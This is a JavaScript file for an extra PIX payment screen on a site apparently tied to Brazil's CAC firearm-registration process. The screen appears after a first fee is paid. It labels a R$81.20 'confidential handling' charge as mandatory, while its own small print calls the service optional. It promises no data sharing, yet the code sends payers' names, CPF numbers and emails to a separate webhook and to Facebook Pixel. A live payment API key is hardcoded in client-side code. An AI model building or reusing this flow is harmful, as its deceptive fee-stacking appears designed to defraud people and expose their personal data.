/**
 * Sistema de Upsell - Taxa Obrigatória (Frete + Sigilo)
 * Valor: R$ 81,20
 * Aparece após o pagamento da primeira taxa (R$ 65,20)
 */

const UPSELL_CONFIG = {
    amount: 8120, // R$ 81,20 em centavos
    description: 'Taxa Fixa de Tratamento Sigiloso',
    apiKey: '2zxA50CzfpTMZgKCwuotYv681fsfo4bcrXrdttHxdD4',
    baseURL: 'https://api.avenpayments.com/v1'
};

// ====== CONTROLE DE UPSELL ======

// Verifica se o pagamento anterior foi concluído e mostra o upsell
function checkAndShowUpsell() {
    console.log('=== Verificando se deve mostrar upsell ===');
    
    const pixPaymentStatus = localStorage.getItem('pixPaymentStatus');
    const upsellAlreadyShown = localStorage.getItem('upsellTaxaObrigatoriaMostrado');
    
    console.log('Status pagamento anterior:', pixPaymentStatus);
    console.log('Upsell já mostrado:', upsellAlreadyShown);
    
    // Se o pagamento anterior foi concluído e o upsell ainda não foi mostrado
    if (pixPaymentStatus === 'PAID' && !upsellAlreadyShown) {
        console.log('✅ Mostrando upsell de taxa obrigatória');
        
        // Marca como mostrado
        localStorage.setItem('upsellTaxaObrigatoriaMostrado', 'true');
        
        // Esconde o conteúdo normal
        const pixContainer = document.getElementById('pix-container');
        if (pixContainer) {
            pixContainer.style.display = 'none';
        }
        
        const loadingScreen = document.getElementById('loadingScreen');
        if (loadingScreen) {
            loadingScreen.style.display = 'none';
        }
        
        // Mostra o upsell
        showTaxaObrigatoriaUpsell();
    }
}

// Mostra o card do upsell
function showTaxaObrigatoriaUpsell() {
    const container = document.getElementById('pix-container');
    
    if (!container) {
        console.error('Container pix-container não encontrado');
        return;
    }
    
    container.style.display = 'block';
    container.innerHTML = `
        <div class="w-full max-w-md mx-auto">
            <!-- Card com border arredondado e sombra -->
            <div class="bg-white rounded-3xl shadow-lg overflow-hidden border-2 border-gray-800">
                
                <!-- Cabeçalho Laranja -->
                <div class="bg-orange-400 py-4 px-6 text-center">
                    <p class="text-gray-800 font-bold text-lg flex items-center justify-center gap-2">
                        <i class="fas fa-triangle-exclamation text-gray-800"></i>
                        TAXA OBRIGATÓRIA
                    </p>
                </div>
                
                <!-- Conteúdo principal -->
                <div class="p-6">
                    
                    <!-- Título com ícone -->
                    <div class="flex items-start gap-3 mb-4">
                        <div class="bg-yellow-100 rounded-lg p-3 flex-shrink-0 text-2xl">
                            📋
                        </div>
                        <div>
                            <h2 class="text-2xl font-bold text-gray-800">
                                Taxa Fixa de Tratamento Sigiloso
                            </h2>
                            <p class="text-orange-600 font-semibold text-lg mt-1">
                                Frete e manuseio com sigilo absoluto
                            </p>
                        </div>
                    </div>
                    
                    <!-- Texto descritivo principal -->
                    <p class="text-gray-600 text-sm leading-relaxed mb-5">
                        Seu processo do CAC envolve dados sensíveis — CPF, endereço, dados da arma e antecedentes. Esta taxa fixa e 
                        <strong>obrigatória</strong> assegura que todo o manuseio dos seus documentos aconteça 
                        <strong>no sigilo total</strong>, sem compartilhamento com terceiros, acesso restrito ao seu processo e rastreio confidencial de ponta a ponta.
                    </p>
                    
                    <!-- Box amarelo com informação importante -->
                    <div class="bg-yellow-100 border-l-4 border-orange-500 p-4 mb-5 rounded">
                        <p class="text-orange-700 text-sm">
                            <i class="fas fa-truck text-orange-600 mr-2"></i>
                            <strong>O envio da documentação não é feito pelos Correios (Sedex ou PAC).</strong> 
                            Toda a remessa segue por <strong>transportadora privada</strong>, com rastreio exclusivo e entrega discreta.
                        </p>
                    </div>
                    
                    <!-- Info da taxa - DESTAQUE COM BORDA VERMELHA -->
                    <div class="border-4 border-red-500 rounded-lg p-4 mb-6 bg-white">
                        <div class="flex items-center justify-between">
                            <span class="text-gray-700 font-bold text-xs">Taxa fixa (frete + sigilo)</span>
                            <div class="text-right">
                                <span class="text-3xl font-bold text-gray-800">R$ 81,20</span>
                            </div>
                        </div>
                        <div class="flex items-center gap-2 text-green-600 font-semibold text-xs mt-3">
                            <i class="fas fa-lock"></i>
                            Documentação tratada com discrição total
                        </div>
                    </div>
                    
                    <!-- Botão verde principal -->
                    <button 
                        onclick="gerarPixUpsellTaxaObrigatoria()" 
                        class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-6 rounded-full text-lg transition shadow-md mb-3"
                    >
                        Gerar Pix
                    </button>
                    
                    <!-- Texto pequeno inferior -->
                    <p class="text-center text-xs text-gray-500">
                        Serviço opcional · Valor único · Sem compartilhamento de dados
                    </p>
                    
                </div>
            </div>
        </div>
    `;
}

// Gera PIX do upsell
async function gerarPixUpsellTaxaObrigatoria() {
    console.log('=== Gerando PIX de Taxa Obrigatória ===');
    
    try {
        // Verifica se AVEN_API existe, se não, usa função local
        let userData;
        if (typeof AVEN_API !== 'undefined' && AVEN_API.getUserData) {
            userData = AVEN_API.getUserData();
        } else {
            // Fallback: busca dados do localStorage
            userData = {
                cpf: localStorage.getItem('cpf') || '12345678900',
                nome: localStorage.getItem('nome') || localStorage.getItem('nomeCompleto') || 'Usuário Teste CAC',
                telefone: localStorage.getItem('telefone') || '5511999999999',
                email: localStorage.getItem('email') || 'teste@cac.com.br',
                endereco: {
                    estado: localStorage.getItem('estado') || 'SP',
                    cidade: localStorage.getItem('cidade') || 'São Paulo',
                    bairro: localStorage.getItem('bairro') || 'Centro',
                    logradouro: localStorage.getItem('logradouro') || 'Rua Exemplo',
                    numero: localStorage.getItem('numero') || '0',
                    complemento: localStorage.getItem('complemento') || '',
                    cep: localStorage.getItem('cep') || '00000000'
                }
            };
        }
        
        const externalRef = `upsell_taxa_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Formata telefone
        let telefoneFormatado = userData.telefone.toString().replace(/\D/g, '');
        if (!telefoneFormatado.startsWith('55')) {
            telefoneFormatado = '55' + telefoneFormatado;
        }
        telefoneFormatado = '+' + telefoneFormatado;
        
        // Formata CPF
        const cpfFormatado = userData.cpf.toString().replace(/\D/g, '');
        
        const payload = {
            amount: UPSELL_CONFIG.amount,
            currency: 'BRL',
            method: 'PIX',
            description: UPSELL_CONFIG.description,
            externalRef: externalRef,
            notificationUrl: window.location.origin + '/webhook/payment',
            ip: await (typeof AVEN_API !== 'undefined' ? AVEN_API.getClientIP() : '0.0.0.0'),
            payer: {
                name: userData.nome,
                taxId: cpfFormatado,
                email: userData.email,
                phone: telefoneFormatado
            },
            items: [
                {
                    quantity: 1,
                    name: 'Taxa Fixa de Tratamento Sigiloso',
                    price: UPSELL_CONFIG.amount,
                    type: 'SERVICE'
                }
            ],
            delivery: {
                fee: 0,
                address: {
                    country: 'BR',
                    state: userData.endereco.estado || 'SP',
                    city: userData.endereco.cidade || 'São Paulo',
                    district: userData.endereco.bairro || 'Centro',
                    street: userData.endereco.logradouro || 'Rua Exemplo',
                    number: userData.endereco.numero || '0',
                    complement: userData.endereco.complemento || '',
                    zipCode: userData.endereco.cep.toString().replace(/\D/g, '') || '00000000'
                }
            },
            metadata: {
                provider: 'registro-cac',
                orderId: externalRef,
                tipo: 'taxa_obrigatoria_frete_sigilo',
                dataRegistro: new Date().toISOString()
            }
        };
        
        console.log('Enviando payload:', JSON.stringify(payload, null, 2));
        
        const response = await fetch(`${UPSELL_CONFIG.baseURL}/payment`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${UPSELL_CONFIG.apiKey}`
            },
            body: JSON.stringify(payload),
            mode: 'cors',
            credentials: 'omit'
        });
        
        console.log('Status:', response.status);
        const responseText = await response.text();
        console.log('Response completa:', responseText);
        
        let data;
        try {
            data = JSON.parse(responseText);
        } catch (e) {
            console.error('Erro ao parsear response:', e);
            data = { message: responseText };
        }
        
        if (!response.ok) {
            console.error('Erro da API:', data);
            throw new Error(data.message || `Erro ${response.status}: ${response.statusText}`);
        }
        
        console.log('✅ PIX de upsell gerado:', data);
        
        // Salva dados
        localStorage.setItem('upsellPixPaymentId', data.id);
        localStorage.setItem('upsellPixPaymentData', JSON.stringify(data));
        
        // Facebook Pixel
        if (typeof fbq !== 'undefined') {
            fbq('track', 'ViewContent', {
                content_name: 'Taxa Fixa de Tratamento Sigiloso',
                content_type: 'product',
                value: 81.20,
                currency: 'BRL'
            });
        }
        
        // Mostra o PIX
        showUpsellPixPayment(data);
        
    } catch (error) {
        console.error('❌ Erro completo:', error);
        console.error('Stack:', error.stack);
        alert('Erro ao gerar PIX: ' + error.message);
    }
}

// Exibe o PIX do upsell
function showUpsellPixPayment(paymentData) {
    console.log('=== Exibindo PIX do Upsell ===');
    
    const pixCode = paymentData.data?.copypaste || paymentData.copypaste;
    
    if (!pixCode) {
        console.error('Código PIX não encontrado:', paymentData);
        return;
    }
    
    const container = document.getElementById('pix-container');
    
    const valorFormatado = (paymentData.amount / 100).toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    });
    
    container.innerHTML = `
        <div class="w-full max-w-md mx-auto">
            <div class="bg-white rounded-3xl shadow-lg overflow-hidden border-2 border-gray-800 p-6">
                
                <!-- Cabeçalho com ícone -->
                <div class="text-center mb-6">
                    <div class="bg-green-100 rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-qrcode text-green-700 text-4xl"></i>
                    </div>
                    <h2 class="text-2xl font-bold text-green-800 mb-1">Pagamento PIX</h2>
                    <p class="text-gray-600 text-lg font-semibold">${valorFormatado}</p>
                </div>
                
                <!-- QR Code -->
                <div id="qrcode-upsell" class="flex justify-center mb-4 p-4 bg-gray-50 rounded"></div>
                <p class="text-sm text-gray-600 text-center mb-4">Escaneie o QR Code com o app do seu banco</p>
                
                <!-- Campo para copiar código -->
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Ou copie o código PIX:</label>
                    <div class="flex gap-2">
                        <input 
                            type="text" 
                            id="upsell-pix-code" 
                            value="${pixCode}" 
                            readonly 
                            class="flex-1 px-3 py-2 border border-gray-300 rounded text-sm font-mono"
                        >
                        <button 
                            onclick="copyUpsellPixCode()" 
                            class="bg-green-700 hover:bg-green-800 text-white px-4 py-2 rounded font-semibold text-sm flex items-center gap-2"
                        >
                            <i class="fas fa-copy"></i>
                            Copiar
                        </button>
                    </div>
                    <p id="copy-feedback-upsell" class="text-green-600 text-sm mt-2 hidden">✓ Código copiado!</p>
                </div>
                
                <!-- Info de segurança -->
                <div class="bg-blue-50 border-l-4 border-blue-500 p-4">
                    <p class="text-sm text-blue-800">
                        <i class="fas fa-info-circle mr-2"></i>
                        Após realizar o pagamento, aguarde alguns instantes. O sistema verificará automaticamente.
                    </p>
                </div>
                
            </div>
        </div>
    `;
    
    // Gera QR Code
    try {
        new QRCode(document.getElementById('qrcode-upsell'), {
            text: pixCode,
            width: 256,
            height: 256,
            colorDark: '#000000',
            colorLight: '#ffffff',
            correctLevel: QRCode.CorrectLevel.H
        });
    } catch (error) {
        console.error('Erro ao gerar QR Code:', error);
    }
    
    // Inicia verificação automática
    startPaymentVerification(paymentData.id, 'upsell');
}

// Copia código PIX
function copyUpsellPixCode() {
    const pixCodeInput = document.getElementById('upsell-pix-code');
    pixCodeInput.select();
    pixCodeInput.setSelectionRange(0, 99999);
    
    try {
        document.execCommand('copy');
        
        const feedback = document.getElementById('copy-feedback-upsell');
        feedback.classList.remove('hidden');
        setTimeout(() => {
            feedback.classList.add('hidden');
        }, 3000);
    } catch (error) {
        console.error('Erro ao copiar:', error);
        alert('Erro ao copiar código. Por favor, copie manualmente.');
    }
}

// Verifica status do pagamento do upsell
async function checkUpsellPaymentStatus(paymentId) {
    try {
        const response = await fetch(`${UPSELL_CONFIG.baseURL}/payment/${paymentId}`, {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${UPSELL_CONFIG.apiKey}`
            }
        });
        
        if (!response.ok) {
            throw new Error('Erro ao verificar status');
        }
        
        return await response.json();
        
    } catch (error) {
        console.error('Erro ao verificar upsell:', error);
        throw error;
    }
}

// Handler de sucesso para o upsell
function onUpsellPaymentSuccess(paymentData) {
    console.log('✅ Upsell pagamento confirmado!');
    
    // Facebook Pixel
    if (typeof fbq !== 'undefined') {
        fbq('track', 'Purchase', {
            value: 81.20,
            currency: 'BRL',
            content_name: 'Taxa Fixa de Tratamento Sigiloso',
            content_type: 'product',
            num_items: 1
        });
    }
    
    // Notificação Pushcut
    try {
        fetch('https://cac-brasil-cac.vercel.app/api/webhook-pushcut', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                id: paymentData.id,
                amount: paymentData.amount || 8120,
                status: 'PAID',
                method: 'PIX',
                tipo: 'upsell_taxa_obrigatoria',
                payer: {
                    name: AVEN_API.getUserData().nome,
                    taxId: AVEN_API.getUserData().cpf,
                    email: AVEN_API.getUserData().email
                }
            })
        });
        console.log('✅ Notificação Pushcut enviada');
    } catch (e) {
        console.warn('Erro ao enviar Pushcut:', e);
    }
    
    // Salva status
    localStorage.setItem('upsellPixPaymentStatus', 'PAID');
    localStorage.setItem('upsellPixPaymentConfirmedAt', new Date().toISOString());
    
    // Mostra mensagem de sucesso
    const container = document.getElementById('pix-container');
    if (container) {
        container.innerHTML = `
            <div class="w-full max-w-md mx-auto">
                <div class="bg-white rounded-3xl shadow-lg overflow-hidden border-2 border-gray-800 p-6 text-center">
                    <div class="bg-green-100 rounded-full w-24 h-24 flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-check text-green-700 text-5xl"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-green-800 mb-4">Pagamento Confirmado!</h2>
                    <p class="text-gray-600 mb-6">
                        Sua taxa de tratamento sigiloso foi registrada. Seus documentos serão processados com máxima discrição.
                    </p>
                    <button 
                        onclick="window.location.reload()" 
                        class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-full"
                    >
                        Concluir
                    </button>
                </div>
            </div>
        `;
    }
}

// ====== INICIALIZAÇÃO ======

// Executa ao carregar a página
document.addEventListener('DOMContentLoaded', function() {
    console.log('=== Verificando upsell na inicialização ===');
    setTimeout(() => {
        checkAndShowUpsell();
    }, 1000);
});

// Expõe funções globalmente
window.gerarPixUpsellTaxaObrigatoria = gerarPixUpsellTaxaObrigatoria;
window.copyUpsellPixCode = copyUpsellPixCode;
window.checkAndShowUpsell = checkAndShowUpsell;
window.onUpsellPaymentSuccess = onUpsellPaymentSuccess;
